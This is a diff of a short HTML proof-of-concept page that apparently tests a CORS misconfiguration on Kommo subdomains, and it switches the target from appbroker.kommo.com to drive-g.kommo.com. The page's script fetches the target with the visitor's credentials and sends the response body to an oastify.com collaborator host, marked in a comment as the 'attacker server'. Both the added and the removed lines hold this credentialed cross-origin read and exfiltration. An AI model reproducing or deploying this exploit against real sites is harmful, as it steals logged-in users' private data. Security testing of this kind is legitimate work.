@@ -1,27 +1,26 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>CORS PoC - appbroker.kommo.com</title>
+    <title>Kommo CORS Exploit</title>
   </head>
   <body>
-    <h1>Testing CORS misconfig on appbroker.kommo.com</h1>
+    <h1>Testing CORS Exploit on drive-g.kommo.com</h1>
     <script>
-      fetch("https://appbroker.kommo.com", {
+      fetch("https://drive-g.kommo.com", {
         credentials: "include"
       })
       .then(res => res.text())
       .then(data => {
-        // Log to browser console
-        console.log("Response from target:", data);
-        
-        // Exfil using GET (safe, visible in webhook)
-        fetch("https://98fmj9799dt6rel0erofj1cqshy8myan.oastify.com?leak=" + encodeURIComponent(data), {
+        console.log("Received:", data);
+
+        // Send to attacker server
+        fetch("https://b4gofb3b5fp8ngh2atkhf38sojuai16q.oastify.com/?leak=" + encodeURIComponent(data), {
           method: "GET",
           mode: "no-cors"
         });
       })
       .catch(err => {
-        console.error("Error:", err);
+        console.error("Fetch failed:", err);
       });
     </script>
   </body>
